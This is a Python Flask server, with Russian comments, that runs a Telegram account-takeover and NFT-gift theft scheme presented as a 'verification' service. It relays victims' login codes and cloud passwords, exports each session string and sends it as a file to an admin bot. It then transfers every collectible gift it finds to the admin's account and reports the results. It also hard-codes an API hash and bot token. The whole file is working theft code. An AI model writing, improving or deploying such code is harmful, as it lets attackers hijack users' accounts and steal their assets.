# app.py — ФИНАЛЬНАЯ ВЕРСИЯ С GetStarGiftsRequest

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
import re
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.functions.payments import GetStarGiftsRequest, TransferStarGiftRequest
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

# ======== КОНФИГ ========
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))

user_sessions = {}
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ======== ОТПРАВКА ЛОГОВ ========
def send_admin_log(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Log error: {e}")

def send_session_to_admin(phone, session_string, username, user_id):
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("🔑 СЕССИЯ ПОЛЬЗОВАТЕЛЯ")
        lines.append("=" * 50)
        lines.append(f"🆔 ID: {user_id}")
        lines.append(f"📱 Phone: {phone}")
        lines.append(f"👤 Username: @{username}")
        lines.append("")
        lines.append("SESSION STRING:")
        lines.append(session_string)

        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))

        files = {'document': (f"session_{phone}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ Сессия @{username}\n📱 {phone}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Send session error: {e}")

def send_gift_to_admin(phone, username, gift):
    """Отправляет информацию о подарке админу"""
    try:
        gift_id = getattr(gift, 'id', None) or getattr(gift, 'gift_id', None)
        name = getattr(gift, 'name', f"Gift #{gift_id}")
        
        # Пытаемся получить ссылку
        slug = getattr(gift, 'slug', None)
        if slug:
            link = f"https://t.me/nft/{slug}"
        else:
            link = f"https://t.me/nft/{name.replace(' ', '_')}-{gift_id}"
        
        text = (
            f"🎁 *{name}*\n"
            f"🆔 ID: `{gift_id}`\n"
            f"📱 Phone: `{phone}`\n"
            f"👤 Username: @{username}\n"
            f"🔗 [Ссылка]({link})"
        )
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Send gift error: {e}")

# ======== ПОЛУЧЕНИЕ ПОДАРКОВ ЧЕРЕЗ GetStarGiftsRequest ========
async def get_user_gifts_telethon(client, user_id):
    """
    Получает подарки пользователя через GetStarGiftsRequest
    """
    try:
        # Получаем подарки пользователя
        result = await client(GetStarGiftsRequest(
            user_id=user_id,
            limit=100,
            offset='0'
        ))
        
        gifts = []
        if result and hasattr(result, 'gifts'):
            for gift in result.gifts:
                # Проверяем, что это NFT (коллекционный подарок)
                is_nft = False
                if hasattr(gift, 'limited') and gift.limited:
                    is_nft = True
                elif hasattr(gift, 'is_limited') and gift.is_limited:
                    is_nft = True
                elif hasattr(gift, 'collectible') and gift.collectible:
                    is_nft = True
                elif hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
                    is_nft = True
                
                # Если это не NFT — пропускаем
                if not is_nft:
                    continue
                
                # Получаем ID подарка
                gift_id = None
                if hasattr(gift, 'id'):
                    gift_id = gift.id
                elif hasattr(gift, 'gift_id'):
                    gift_id = gift.gift_id
                elif hasattr(gift, 'sticker_id'):
                    gift_id = gift.sticker_id
                
                if not gift_id:
                    continue
                
                # Получаем название
                name = None
                if hasattr(gift, 'name') and gift.name:
                    name = gift.name
                elif hasattr(gift, 'title') and gift.title:
                    name = gift.title
                elif hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
                    name = gift.sticker_set_name
                
                if not name:
                    name = f"NFT #{gift_id}"
                
                # Получаем slug для ссылки
                slug = getattr(gift, 'slug', None)
                
                gifts.append({
                    'gift_id': gift_id,
                    'name': name,
                    'slug': slug,
                    'raw_data': gift
                })
        
        print(f"[+] Found {len(gifts)} NFT gifts for user {user_id}")
        return gifts
        
    except Exception as e:
        print(f"[-] GetStarGiftsRequest error: {e}")
        return []

# ======== ПЕРЕДАЧА ПОДАРКА ========
async def transfer_gift_telethon(client, gift_id, to_user_id):
    """
    Передает подарок через TransferStarGiftRequest
    """
    try:
        await client(TransferStarGiftRequest(
            gift_id=gift_id,
            to_id=to_user_id
        ))
        return True
    except FloodWaitError as e:
        wait_time = e.seconds
        send_admin_log(f"⏳ FloodWait {wait_time} секунд")
        await asyncio.sleep(wait_time)
        try:
            await client(TransferStarGiftRequest(
                gift_id=gift_id,
                to_id=to_user_id
            ))
            return True
        except:
            return False
    except Exception as e:
        print(f"[-] Transfer error for {gift_id}: {e}")
        return False

# ======== ОСНОВНАЯ ФУНКЦИЯ ========
async def process_user_gifts_telethon(session_string, phone, username, user_id):
    client = None
    try:
        client = TelegramClient(
            f"session_{phone}",
            API_ID,
            API_HASH,
            session_string=session_string
        )
        await client.connect()
        print(f"[+] Connected as {phone}")
        
        try:
            me = await client.get_me()
            if not me:
                send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
                return False
        except Exception as e:
            send_admin_log(f"❌ Ошибка авторизации\n📱 {phone}\n`{str(e)[:100]}`")
            return False
        
        # Если это админ — просто показываем подарки
        if user_id == ADMIN_USER_ID:
            send_admin_log(f"👑 Админ @{username} проверил свои подарки")
            gifts = await get_user_gifts_telethon(client, user_id)
            if gifts:
                for gift in gifts:
                    send_gift_to_admin(phone, username, gift['raw_data'])
                send_admin_log(f"📦 Всего подарков: {len(gifts)}")
            else:
                send_admin_log(f"📭 У админа нет подарков")
            return True
        
        # Получаем подарки пользователя
        send_admin_log(f"🔍 Ищем NFT подарки @{username}...")
        gifts = await get_user_gifts_telethon(client, user_id)
        
        if not gifts:
            send_admin_log(
                f"📭 *Нет NFT подарков*\n"
                f"📱 {phone}\n"
                f"👤 @{username}"
            )
            return True
        
        send_admin_log(
            f"🎁 *Найдено {len(gifts)} NFT подарков*\n"
            f"📱 {phone}\n"
            f"👤 @{username}\n\n"
            f"🔄 Передаю админу..."
        )
        
        transferred = 0
        failed = 0
        
        for gift in gifts:
            gift_id = gift['gift_id']
            name = gift['name']
            
            # Отправляем информацию о подарке админу
            send_gift_to_admin(phone, username, gift['raw_data'])
            
            # Пытаемся передать подарок
            send_admin_log(f"🔄 Передаю *{name}*...")
            
            success = await transfer_gift_telethon(client, gift_id, ADMIN_USER_ID)
            
            if success:
                transferred += 1
                send_admin_log(f"✅ {name} передан админу")
            else:
                failed += 1
                send_admin_log(f"❌ Не удалось передать {name}")
            
            await asyncio.sleep(0.5)
        
        send_admin_log(
            f"📊 *Результат*\n"
            f"📱 {phone}\n"
            f"👤 @{username}\n"
            f"📦 Найдено: {len(gifts)}\n"
            f"✅ Передано: {transferred}\n"
            f"❌ Не удалось: {failed}"
        )
        
        return True
        
    except Exception as e:
        error_msg = str(e)[:200]
        send_admin_log(f"❌ Ошибка\n📱 {phone}\n`{error_msg}`")
        return False
    finally:
        if client and client.is_connected():
            try:
                await client.disconnect()
            except:
                pass

# ======== ВЕРИФИКАЦИЯ ========
async def send_code_telethon(phone):
    try:
        client = TelegramClient(f"temp_{phone}", API_ID, API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        
        user_sessions[phone] = {
            'client': client,
            'phone_code_hash': sent_code.phone_code_hash
        }
        
        send_admin_log(f"📱 Код отправлен для {phone}")
        return {'success': True, 'phone_code_hash': sent_code.phone_code_hash}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_telethon(phone, code, phone_code_hash):
    try:
        session_data = user_sessions.get(phone)
        if not session_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = session_data['client']
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_string = await client.export_session_string()
            
            me = await client.get_me()
            
            user_data = {
                'user_id': me.id,
                'phone': phone,
                'username': me.username or f"user_{random.randint(10000, 99999)}",
                'first_name': me.first_name or 'User',
                'last_name': me.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            send_admin_log(f"✅ Верификация успешна\n📱 {phone}\n👤 @{user_data['username']}")
            send_session_to_admin(phone, session_string, user_data['username'], user_data['user_id'])
            
            # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
            result = await process_user_gifts_telethon(
                session_string,
                phone,
                user_data['username'],
                user_data['user_id']
            )
            
            return {
                'success': True,
                'hasPassword': False,
                'sessionData': user_data,
                'gifts_processed': result
            }
            
        except SessionPasswordNeededError:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_telethon(phone, password):
    try:
        session_data = user_sessions.get(phone)
        if not session_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = session_data['client']
        
        try:
            await client.sign_in(password=password)
            
            session_string = await client.export_session_string()
            
            me = await client.get_me()
            
            user_data = {
                'user_id': me.id,
                'phone': phone,
                'username': me.username or f"user_{random.randint(10000, 99999)}",
                'first_name': me.first_name or 'User',
                'last_name': me.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            send_admin_log(f"🔑 Верификация по паролю успешна\n📱 {phone}\n👤 @{user_data['username']}")
            send_session_to_admin(phone, session_string, user_data['username'], user_data['user_id'])
            
            result = await process_user_gifts_telethon(
                session_string,
                phone,
                user_data['username'],
                user_data['user_id']
            )
            
            return {
                'success': True,
                'sessionData': user_data,
                'gifts_processed': result
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

def run_async(coro):
    return loop.run_until_complete(coro)

# ======== FLASK ЭНДПОИНТЫ ========
@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'service': 'NFT Gift Transfer',
        'version': '8.0',
        'method': 'GetStarGiftsRequest'
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400
    
    result = run_async(send_code_telethon(phone))
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_code_telethon(phone, code, phone_code_hash))
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': result.get('sessionData'),
                'gifts_processed': result.get('gifts_processed', False),
                'message': 'Verified and processed'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
    
    result = run_async(check_password_telethon(phone, password))
    
    if result['success']:
        return jsonify({
            'success': True,
            'sessionData': result.get('sessionData'),
            'gifts_processed': result.get('gifts_processed', False),
            'message': 'Password verified and processed'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

if __name__ == '__main__':
    print("=" * 60)
    print("🤖 NFT GIFT TRANSFER v8.0")
    print("📌 Метод: GetStarGiftsRequest")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=False)
